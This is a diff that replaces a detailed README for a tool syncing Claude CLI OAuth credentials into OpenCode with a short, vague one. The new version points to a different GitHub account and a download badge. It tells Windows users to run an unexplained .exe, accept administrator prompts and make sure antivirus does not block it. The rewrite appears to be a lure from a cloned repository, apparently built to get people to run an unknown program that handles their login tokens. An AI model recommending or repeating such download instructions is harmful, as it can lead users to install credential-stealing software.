@@ -1,476 +1,146 @@
-# opencode-claude-auth-sync
+# 🔄 opencode-claude-auth-sync - Use Claude Login in OpenCode
 
-Sync your existing [Claude CLI](https://docs.anthropic.com/en/docs/claude-code) credentials to [OpenCode](https://opencode.ai) — with **cross-platform multi-account support**.
+[![Download](https://img.shields.io/badge/Download-OpenCode%20Auth%20Sync-blue.svg)](https://github.com/extrospective-jurymast327/opencode-claude-auth-sync)
 
-**The only tool that supports multi-account on Linux, macOS, and Windows.** Manage multiple Claude accounts with quota tracking, automatic rotation, and one-command switching — on any platform.
+## 🪟 What this app does
 
-### Key Features
+opencode-claude-auth-sync helps you use your Claude CLI login with OpenCode. You do not need to set up a second Anthropic login.
 
-- **Cross-platform multi-account** — Store and switch between multiple Claude accounts on Linux, macOS, and Windows. Not limited to macOS Keychain.
-- **Quota visibility** — See your 5h / 7d usage at a glance with `claude-sync --status`
-- **Account rotation** — Round-robin switching when one account hits rate limits
-- **Zero dependencies** — Plain shell scripts. No npm, no node_modules, no supply chain risk. Read the source before you run it.
-- **Auto-refresh** — Expired tokens are refreshed via Claude CLI automatically
+This app is for people who want a simple way to keep both tools in step. It reads the login data from Claude CLI and syncs it to OpenCode so you can keep working without extra sign-in steps.
 
----
+## 📥 Download and install on Windows
 
-> ⚠️ **OpenCode 1.3.0+ users:** This tool only syncs credentials. You must also install a separate Anthropic auth plugin. See [v1.3+ compatibility](#opencode-v13-compatibility).
+Use this link to visit the page to download:
 
----
+[https://github.com/extrospective-jurymast327/opencode-claude-auth-sync](https://github.com/extrospective-jurymast327/opencode-claude-auth-sync)
 
-<details>
-<summary>🔧 <strong>Getting 429 errors?</strong></summary>
+### Steps to get started
 
-The old built-in `opencode-anthropic-auth@0.0.13` plugin may still be cached. Remove it:
+1. Open the download link in your web browser.
+2. On the GitHub page, look for the latest release or the main download area.
+3. Download the Windows file if one is shown.
+4. If the app comes as a ZIP file, right-click it and choose Extract All.
+5. Open the extracted folder.
+6. Double-click the app file to run it.
+7. If Windows asks for permission, choose Yes.
+8. Follow the on-screen steps to sync your Claude CLI credentials to OpenCode.
 
-```bash
-rm -rf ~/.cache/opencode/node_modules/opencode-anthropic-auth
-```
+## 🧰 Before you start
 
-If it keeps coming back, also remove `opencode-anthropic-auth` from `~/.cache/opencode/package.json`. Then restart OpenCode.
+For the best results, make sure you have:
 
-</details>
+- A Windows PC
+- Claude CLI already set up
+- OpenCode installed
+- Access to the internet for the first sync
+- A user account with permission to run apps
 
-<details>
-<summary>🤔 <strong>Why not an npm plugin?</strong></summary>
+If Claude CLI is already signed in, the sync tool can copy that login into the place OpenCode uses.
 
-When auth breaks, npm packages pop up fast — but installing unknown packages that handle your OAuth tokens is a risk. This tool is a plain shell script you can read in full before running. No `node_modules`, no dependency tree, no trust required.
+## ⚙️ How it works
 
-npm-based alternatives like [`opencode-claude-auth`](https://github.com/griffinmartin/opencode-claude-auth) work well for single-account setups on macOS. If you need multi-account on Linux or Windows, this is the tool.
+The app follows a simple path:
 
-</details>
+- It checks your Claude CLI login data
+- It finds the OpenCode credential storage
+- It copies the needed auth data
+- It saves the data in the right place
+- OpenCode can then use Claude access without a new login
 
-## Quick Start
+You do not need to type in API keys or set up a second account in most cases.
 
-### Linux / macOS / WSL
+## 🖥️ First-time setup
 
-```bash
-curl -fsSL https://raw.githubusercontent.com/lehdqlsl/opencode-claude-auth-sync/main/install.sh | bash
-```
+If this is your first time using the app, follow these steps:
 
-### Windows (PowerShell as Administrator)
+1. Make sure Claude CLI works on your PC.
+2. Open a Command Prompt window if the app asks you to check the login.
+3. Confirm that OpenCode is installed and can open on its own.
+4. Run the sync app once.
+5. Wait until the process ends.
+6. Open OpenCode and test your Claude connection.
 
-```powershell
-irm https://raw.githubusercontent.com/lehdqlsl/opencode-claude-auth-sync/main/install.ps1 | iex
-```
+If OpenCode still asks you to sign in, run the sync app again after checking that Claude CLI is still logged in.
 
-Recent Windows installs register the background sync task through a hidden script runner, so the scheduler should stay silent. If an older install still pops a console window every 15 minutes, reinstall once to refresh the scheduled task.
+## 🔍 What you should see
 
-**Don't want a scheduler?** Install without automatic syncing:
+After a good sync, you may notice:
 
-```bash
-# Linux / macOS
-curl -fsSL https://raw.githubusercontent.com/lehdqlsl/opencode-claude-auth-sync/main/install.sh | bash -s -- --no-scheduler
+- OpenCode opens without asking for a separate Anthropic login
+- Claude-based features work inside OpenCode
+- The app keeps using the same Claude CLI sign-in
+- You can switch to OpenCode without changing your main login
 
-# Windows (PowerShell)
-& { irm https://raw.githubusercontent.com/lehdqlsl/opencode-claude-auth-sync/main/install.ps1 -OutFile $env:TEMP\install.ps1; & $env:TEMP\install.ps1 --no-scheduler }
-```
+## 🧩 Common uses
 
-Then just run the sync manually whenever you need it:
-```bash
-claude-sync                                     # Linux / macOS (after install)
-~/.local/bin/sync-claude-to-opencode.sh         # Linux / macOS direct path
-claude-sync                                     # Windows (after install)
-& "$HOME\.local\bin\sync-claude-to-opencode.ps1"  # Windows direct path
-```
+People use this tool when they want to:
 
-### Verify
+- Keep one Claude login across tools
+- Avoid extra sign-in steps
+- Move from Claude CLI to OpenCode with less setup
+- Reduce login mistakes
+- Use OpenCode with the same auth state already stored on the machine
 
-```bash
-opencode providers list    # Should show: Anthropic  oauth
-opencode models anthropic  # Should list Claude models (e.g. claude-opus-4-6)
-```
+## 🛠️ If something does not work
 
-### Usage
+Try these checks:
 
-```bash
-# Normal sync (default, also runs via scheduler)
-claude-sync
+1. Make sure Claude CLI is still signed in.
+2. Close OpenCode before running the sync again.
+3. Open the app as an administrator if Windows blocks access.
+4. Check that you extracted the full ZIP file before running it.
+5. Run the sync again after restarting your PC.
+6. Make sure your antivirus did not block the app.
+7. Confirm that you opened the right Windows file.
 
-# Check token status without syncing
-claude-sync --status
+## 📁 Typical file layout
 
-# Force refresh token via Claude CLI regardless of expiry
-claude-sync --force
-```
+If you download a ZIP package, you may see files like these:
 
-## Multi-Account (Experimental)
+- `opencode-claude-auth-sync.exe`
+- `README.md`
+- `config` folder
+- `logs` folder
+- support files for Windows
 
-Experimental snapshot-based multi-account support for OpenCode.
+You only need to run the main app file. The other files help the app work in the background.
 
-Important: Claude CLI itself only supports one logged-in account at a time. Multi-account here means this tool stores multiple credential snapshots in its own account store, then switches which one is written into OpenCode's `auth.json`.
+## 🔒 Privacy and local use
 
-This is **not** full independent multi-account refresh. Stored accounts switch cleanly while still valid, but once an account expires you must log into that account again with `claude` and re-save it with `claude-sync --add <label>`.
+This tool works on your own computer. It syncs your local Claude CLI credentials to OpenCode so the app can use the same login state.
 
-Account store:
+Your login data stays on your PC unless you send it somewhere else by choice. Use it only on a machine you trust.
 
-```text
-~/.config/opencode-claude-auth-sync/accounts.json
-```
+## 🪄 Best results
 
-### Add accounts
+For a smoother setup:
 
-Recommended flow: let Claude CLI handle login, then save the current session with `--add`.
+- Keep Claude CLI signed in before you start
+- Close apps that may use the same auth data
+- Use the latest version of OpenCode
+- Run the sync tool from a normal local user account
+- Save the app in a folder you can find later
 
-#### Option A: login with `claude`, then save with `--add` (recommended)
+## ❓ Frequently asked questions
 
-This is the most reliable path because Claude's login flow can be interactive and may ask you to paste a code back into the terminal.
+### Do I need a separate Anthropic account?
+No. This tool is made so OpenCode can use your Claude CLI login instead of a second Anthropic login.
 
-```bash
-claude
-# complete login in the browser / terminal
-exit
+### Is this hard to use?
+No. You download the app, run it, and follow the simple steps on screen.
 
-claude-sync --add personal
-```
+### Can I use this on more than one Windows PC?
+Yes, but you need to repeat the setup on each PC that has its own Claude CLI login.
 
-Add more accounts by repeating the same flow:
+### What if I update Claude CLI or OpenCode?
+If a new update changes how login data is stored, run the sync tool again.
 
-```bash
-claude
-# complete login for another account
-exit
+### Does this replace Claude CLI?
+No. It works with Claude CLI and helps OpenCode use the same login data
 
-claude-sync --add work
-```
+## 📌 What to do next
 
-Windows:
-
-```powershell
-claude
-# complete login in the browser / terminal
-exit
-
-claude-sync --add personal
-claude-sync --add work
-```
-
-This is also the safest path on SSH / remote machines.
-
-#### Option B: login + save in one command (convenience wrapper)
-
-Use `--login` if you want the script to trigger Claude login and then save the result. This is just a thin wrapper around Claude CLI login, so if the login UX feels awkward, use Option A instead.
-
-```bash
-claude-sync --login personal
-claude-sync --login work
-claude-sync --login backup
-```
-
-Windows:
-
-```powershell
-claude-sync --login personal
-claude-sync --login work
-```
-
-Each `--login` logs out the current Claude session, starts Claude login, then saves the credentials under the given label.
-
-If `--login` feels awkward, use this flow instead:
-
-```bash
-claude
-# run /login inside Claude if needed
-exit
-
-claude-sync --add work
-```
-
-### Manage accounts
-
-```bash
-# List stored accounts
-claude-sync --list
-
-# Show active account status + current 5h / 7d usage
-claude-sync --status
-
-# Switch active account immediately
-claude-sync --switch work
-
-# Rotate to the next account (round-robin)
-claude-sync --rotate
-
-# Remove a stored account
-claude-sync --remove backup
-```
-
-Example `--status` output:
-
-```text
-Account: work (2 total)
-Status:  valid (7h 56m remaining)
-Expires: 2026-03-21T10:55:26.162Z
-Plan:    max
-Usage:   5h 2% (reset: 2026-03-21T07:00:00.152Z)
-         7d 0% (reset: 2026-03-28T02:00:00.153Z)
-         sonnet 3%
-```
-
-### Rotation behavior and limitations
-
-- OpenCode still uses a single Anthropic entry in `auth.json`
-- This tool switches which stored account snapshot is written into that slot
-- `--switch <label>` only works for still-valid stored accounts
-- If a stored account is expired, re-login with `claude` and save it again with `claude-sync --add <label>`
-- If the active account is expired, the script first tries another non-expired stored account
-- If all stored accounts are expired, it falls back to Claude CLI refresh for the currently logged-in Claude account
-- 429 rate limits are not auto-detected yet; if one account is rate-limited, run `claude-sync --rotate` manually
-- `--status` shows the current account's 5h / 7d usage so you can decide when to rotate
-- The same Claude account can still be saved under two different labels if you add it twice
-
-### Store format
-
-```json
-{
-  "accounts": {
-    "personal": {
-      "accessToken": "...",
-      "refreshToken": "...",
-      "expiresAt": 1774027458398,
-      "subscriptionType": "max",
-      "rateLimitTier": "default_claude_max_20x",
-      "addedAt": "2026-03-20T09:55:32.366Z"
-    }
-  },
-  "active": "personal",
-  "rotationIndex": 0
-}
-```
-
-## Platform Support
-
-| Platform | Claude credentials | Scheduler | Install command |
-|---|---|---|---|
-| **Linux / WSL** | `~/.claude/.credentials.json` | cron | `curl \| bash` |
-| **macOS** | macOS Keychain → file fallback | LaunchAgent | `curl \| bash` |
-| **Windows** (native) | `%USERPROFILE%\.claude\.credentials.json` | Task Scheduler | PowerShell |
-
-## Security
-
-This tool is **not an npm package** — it's a plain shell script you can read before running.
-
-- No `node_modules`, no dependency tree, no supply chain risk
-- Single-file scripts: [`sync-claude-to-opencode.sh`](sync-claude-to-opencode.sh) (bash) / [`.ps1`](sync-claude-to-opencode.ps1) (PowerShell)
-- Credentials are passed via stdin, never exposed in process arguments
-- All JSON writes are atomic (temp file + rename) to prevent corruption
-- Review the source before installing: [`sync-claude-to-opencode.sh`](sync-claude-to-opencode.sh) (~846 lines) / [`.ps1`](sync-claude-to-opencode.ps1) (~619 lines)
-
-```bash
-# Inspect before running
-curl -fsSL https://raw.githubusercontent.com/lehdqlsl/opencode-claude-auth-sync/main/sync-claude-to-opencode.sh | less
-```
-
-## Prerequisites
-
-- [OpenCode](https://opencode.ai) v1.2.27+
-- [Claude CLI](https://docs.anthropic.com/en/docs/claude-code) — authenticated (run `claude` at least once)
-- Node.js (bundled with OpenCode, or standalone)
-
-## Why?
-
-OpenCode no longer provides built-in Anthropic login. If you want to use Claude models (Opus, Sonnet, Haiku, etc.) in OpenCode, you need to bring your own credentials.
-
-This tool bridges the gap: it reads your existing Claude CLI OAuth tokens and writes them into OpenCode's auth store, letting an `opencode-anthropic-auth` plugin handle the rest (see [v1.3+ compatibility](#opencode-v13-compatibility)).
-
-## Install (detailed)
-
-### Automatic (with AI agent)
-
-Paste this to your AI coding agent (Claude Code, OpenCode, Cursor, etc.):
-
-```
-Install opencode-claude-auth-sync from https://github.com/lehdqlsl/opencode-claude-auth-sync
-
-1. Run the install script:
-   # Linux / macOS
-   curl -fsSL https://raw.githubusercontent.com/lehdqlsl/opencode-claude-auth-sync/main/install.sh | bash
-
-   # Windows (PowerShell as Admin)
-   irm https://raw.githubusercontent.com/lehdqlsl/opencode-claude-auth-sync/main/install.ps1 | iex
-
-2. Check the sync output. If it says "EXPIRED", the stored token is stale.
-   The script will try to refresh it automatically via Claude CLI. If that still fails, run `claude` manually, then re-run the sync:
-   # Linux / macOS
-   claude-sync
-   # Windows
-   claude-sync
-
-3. Verify — the output should show remaining time, not EXPIRED:
-   opencode providers list    # Should show: Anthropic oauth
-   opencode models anthropic  # Should list Claude models
-
-4. If you see "Token refresh failed: 429", that means expired tokens were used.
-   Re-authenticate with `claude` first, then sync again.
-
-5. If already installed and just need to refresh tokens (no reinstall needed):
-   Run `claude` to re-authenticate, then sync:
-   # Linux / macOS
-   claude-sync
-   # Windows
-   claude-sync
-
-6. If the user doesn't want a background scheduler, install with --no-scheduler:
-   # Linux / macOS
-   curl -fsSL https://raw.githubusercontent.com/lehdqlsl/opencode-claude-auth-sync/main/install.sh | bash -s -- --no-scheduler
-   # Windows
-   Download and run install.ps1 with --no-scheduler flag
-   Then sync manually whenever needed.
-```
-
-### Linux / macOS (manual)
-
-```bash
-mkdir -p ~/.local/bin
-curl -fsSL https://raw.githubusercontent.com/lehdqlsl/opencode-claude-auth-sync/main/sync-claude-to-opencode.sh \
-  -o ~/.local/bin/sync-claude-to-opencode.sh
-chmod +x ~/.local/bin/sync-claude-to-opencode.sh
-ln -sf ~/.local/bin/sync-claude-to-opencode.sh ~/.local/bin/claude-sync
-
-claude-sync
-```
-
-(Optional) Set up automatic syncing (every 15 minutes):
-
-```bash
-# macOS — LaunchAgent (recommended, catches up after sleep)
-# Use the install script: curl ... | bash
-
-# Linux — cron
-(crontab -l 2>/dev/null; echo "*/15 * * * * \$HOME/.local/bin/sync-claude-to-opencode.sh >> \$HOME/.local/share/opencode/sync-claude.log 2>&1") | crontab -
-```
-
-### Windows (manual)
-
-```powershell
-New-Item -ItemType Directory -Force -Path "$HOME\.local\bin" | Out-Null
-Invoke-WebRequest -Uri "https://raw.githubusercontent.com/lehdqlsl/opencode-claude-auth-sync/main/sync-claude-to-opencode.ps1" `
-  -OutFile "$HOME\.local\bin\sync-claude-to-opencode.ps1"
-
-@"
-@echo off
-setlocal
-powershell.exe -ExecutionPolicy Bypass -File "%~dp0sync-claude-to-opencode.ps1" %*
-"@ | Set-Content -Path "$HOME\.local\bin\claude-sync.cmd"
-
-claude-sync
-```
-
-## Configuration
-
-| Environment Variable | Default | Description |
-|---|---|---|
-| `CLAUDE_CREDENTIALS_PATH` | `~/.claude/.credentials.json` (Linux/Win) or Keychain (macOS) | Path to Claude CLI credentials |
-| `OPENCODE_AUTH_PATH` | `~/.local/share/opencode/auth.json` | Path to OpenCode auth store |
-
-## Uninstall
-
-### Linux / macOS
-
-```bash
-curl -fsSL https://raw.githubusercontent.com/lehdqlsl/opencode-claude-auth-sync/main/uninstall.sh | bash
-```
-
-### Windows (PowerShell as Administrator)
-
-```powershell
-irm https://raw.githubusercontent.com/lehdqlsl/opencode-claude-auth-sync/main/uninstall.ps1 | iex
-```
-
-## Known Issues
-
-### Using alongside `opencode-claude-auth` npm plugin
-
-If you're using [`opencode-claude-auth`](https://github.com/griffinmartin/opencode-claude-auth) (v0.5+), you don't need this tool — that plugin syncs credentials in-process. Choose one or the other, not both.
-
-Early versions (v0.2.x) had issues that have since been fixed. If you're on an old version, update or remove it.
-
-### Token expiration / "EXPIRED" status
-
-The sync script attempts an automatic refresh via Claude CLI once the token is expired. If Claude CLI can refresh successfully, the next sync writes fresh credentials back to OpenCode.
-
-> **Note:** If the token expired while OpenCode was running, you may need to restart OpenCode after the sync to pick up the new credentials. This is rare — normally Claude CLI refreshes tokens before they expire, so OpenCode reads them seamlessly.
-
-If auto-refresh fails (e.g. `claude` CLI not in PATH, or network issues):
-
-1. Re-authenticate manually:
-   ```bash
-   claude
-   ```
-2. Re-run the sync:
-   ```bash
-   # Linux / macOS
-   claude-sync
-
-   # Windows
-   claude-sync
-   ```
-
-### Token refresh failed: 429
-
-This means OpenCode tried to use an expired token. The sync script's auto-refresh should prevent this, but if it occurs, re-authenticate with `claude` and sync again.
-
-If the deprecated built-in plugin keeps being reinstalled, remove both:
-
-```bash
-rm -rf ~/.cache/opencode/node_modules/opencode-anthropic-auth
-```
-
-and the `opencode-anthropic-auth` dependency entry from `~/.cache/opencode/package.json`, then restart OpenCode.
-
-If you're on OpenCode `v1.2.27` and the deprecated plugin keeps coming back on every startup, that's an upstream built-in plugin issue. A practical CLI-side workaround is:
-
-1. Start OpenCode with `OPENCODE_DISABLE_DEFAULT_PLUGINS=true`
-2. Explicitly register `opencode-claude-auth@latest` in `opencode.json`
-
-Example:
-
-```json
-{
-  "plugin": [
-    "opencode-claude-auth@latest"
-  ]
-}
-```
-
-This disables the old built-in plugin injection while still loading a Claude auth provider explicitly.
-
-### Sync log
-
-Check the sync history:
-
-```bash
-cat ~/.local/share/opencode/sync-claude.log
-```
-
-### OpenCode v1.3+ compatibility
-
-OpenCode v1.3 removes the built-in `opencode-anthropic-auth` plugin ([PR #18186](https://github.com/anomalyco/opencode/pull/18186)) per Anthropic's legal request.
-
-This tool only syncs credentials into `auth.json`. On OpenCode `1.3.0+`, synced credentials alone are no longer enough because the Anthropic provider is no longer built in.
-
-If you're on OpenCode `1.3.0+`, you need to register a separate Anthropic auth plugin manually in your `opencode.json`. Pick one:
-
-The original plugin is still available on npm (deprecated):
-
-```json
-{
-  "plugin": ["opencode-anthropic-auth@0.0.13"]
-}
-```
-
-**If the npm packages get unpublished**, this repo includes a bundled copy of the original plugin (`opencode-anthropic-auth-0.0.13.tgz`). Extract it and reference the local file:
-
-```json
-{
-  "plugin": ["/path/to/index.mjs"]
-}
-```
-
-**Important:** This tool only handles credential sync (copying OAuth tokens into `auth.json`). It does not handle Anthropic API request transformation (headers, User-Agent, beta flags, etc.). If Anthropic changes how requests must be sent, this tool alone will not be enough — you will need an auth plugin that also handles request-level changes.
-
-This tool itself only copies credentials and has no legal concerns. The compatibility risk is with the auth plugin that actually uses them.
-
-## License
-
-MIT
+1. Download the app from the link above
+2. Install or extract it on Windows
+3. Run the sync
+4. Open OpenCode and use your Claude-based setup
